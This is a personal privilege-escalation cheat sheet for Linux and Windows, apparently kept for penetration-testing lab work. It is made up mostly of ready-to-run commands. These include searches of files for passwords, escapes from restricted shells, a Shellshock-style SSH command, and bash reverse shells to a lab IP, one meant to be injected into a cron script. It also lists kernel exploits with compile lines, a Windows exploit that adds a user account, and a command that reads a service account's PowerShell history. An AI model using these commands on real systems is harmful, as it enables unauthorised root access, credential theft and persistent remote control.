Linux: https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist

What's the OS? What version? What architecture?
  cat /etc/*-release
  uname -i
  lsb_release -a (Debian based OSs)

Who are we? Where are we?
  ​id
  pwd

Who uses the box? What users? (And which ones have a valid shell)
  cat /etc/passwd
  grep -vE "nologin|false" /etc/passwd

What's currently running on the box? What active network services are there?
  ps aux
  netstat -antup

What's installed? What kernel is being used?
  dpkg -l (Debian based OSs)
  rpm -qa (CentOS / openSUSE )
  uname -a

Identify:
  id
  uname -a
  cat /etc/issue
  ls -ahlR /root/; ls -ahlR /home/
  grep -rl password *
  for file in $(grep -rl password *); do cat $file | grep password ;done
  for file in $(grep -rl offensive *); do cat $file | grep offensive ;done 

Writable files:
  find / -writable -type d 2>/dev/null

Mounted disks:
  cat /etc/fstab
  mount
  /bin/lsblk

Suid binaries:
  find / -perm -u=s -type f 2>/dev/null

Crontab: 
  cat /etc/crontab
  grep "CRON" /var/log/cron.log

Autoelevate:
  ./unix-privesc-check standard > output.txt  (http://pentestmonkey.net/tools/unix-privesc-check)

Escape restricted shell:
  echo os.system("/bin/bash")
  python -c 'import pty; pty.spawn("/bin/bash")'
  python -c 'import pty; pty.spawn("/bin/sh")'
  /bin/sh -i
  ssh ryuu@10.11.1.72 -t "() { :; }; /bin/bash"

netstat -antp

Reverse shell:
  bash -i >& /dev/tcp/10.11.0.76/444 0>&1
Sevices examination:
Linux:
  sudo -l		-Allowed to run
  ls -ahlR /home/; ls -ahlR /root/
  find / -perm -2 ! -type l -ls 2>/dev/null	-Look for cron scripts, if any
  find / -perm -4000 -o -perm -2000 -exec ls -ldb {} \;
  /bin/bash -i >& /dev/tcp/10.11.0.76/443 0>&1	-Inject this reverse shell into cron script

  dirty (40839.c )	- Linux 2.6.32, 2.6.22 (Linux 2.6.22 - 3.9)	gcc -pthread 40839.c -o dirty -lcrypt
  linux2421		- Linux 2.4.7(crashed)
  9.0 (28718.c)		- FreeBSD 9.0
  centsos45 (9542.c)	- CentOS 4.4 - 4.5 (Linux 2.6 - 2.6.19)
  linux26 (5093.c)	- Linux (2.6.23 - 2.6.24)
  18411.c			- Linux 2.6.39 < 3.2.2 (Ubuntu 11.10, kernel 3.0.0-12)
  37292.c	(ububtu)	- ubuntu 14.04 (Linux 3.13 - 3.19)

-----------------------------------------------------------
Windows: https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation
  check services for exe paths
  ?:
    accesschk.exe -uwcqv "Authenticated Users" * /accepteula
  WR files:
    accesschk.exe -uws "Everyone" "C:\Program Files"
  UW folders on c:
    accesschk64.exe  -uwdqs Users c:\*
  WR files from PS:
    Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
  View services with binaries:
    Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}
  Services with auto start outside c:\windows:
    wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows"
  Check binary permissions (Look for W or F tag):
    icacls "C:\Program Files\Serviio\bin\ServiioService.exe"
  Logged in users
    qwinsta
  Established connections:
    Mounted drives, RDP, SSH, etc to other hosts
  Sched tasks:
    schtasks /query /fo LIST /v
  Installed soft via windows installer:
    wmic product get name, version, vendor
  OS patches with date:
    wmic qfe get Caption, Description, HotFixID, InstalledOn
  PATH Hijacking https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/dll-hijacking
    for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
  Drivers
    driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object ‘Display Name’, ‘Start Mode’, Path
    Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}
  Check for install elevated:
    reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
    reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer

Autoelevate:
  winpeas https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS
  windows-privesc-check2.exe --dump -G (http://pentestmonkey.net/windows-privesc-check)
  root@kali:/opt/Windows-Exploit-Suggester# python windows-exploit-suggester.py --database 2018-07-25-mssb.xls --systeminfo /root/sysinfo.txt > result.txt

CVE-2019-1388 https://github.com/nobodyatall648/CVE-2019-1388

Kernel exploits:
  KiTrap0D (KB979682)	use exploit/windows/local/ms10_015_kitrap0d
  MS11-011 (KB2393802)
  MS10-059 (KB982799)	Churraskito.exe "C:\windows\system32\cmd.exe" "net user 123 123 /add"
  MS10-021 (KB979683) 	MS office
  MS11-080 (KB2592799)	megacorp/exploits/windows-kernel-exploits/MS11-080
  MS12-042 (KB2709715)

KiTrap0D (KB979682), MS11-011 (KB2393802), MS10-059 (KB982799), MS10-021 (KB979683), MS11-080 (KB2592799)

  type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt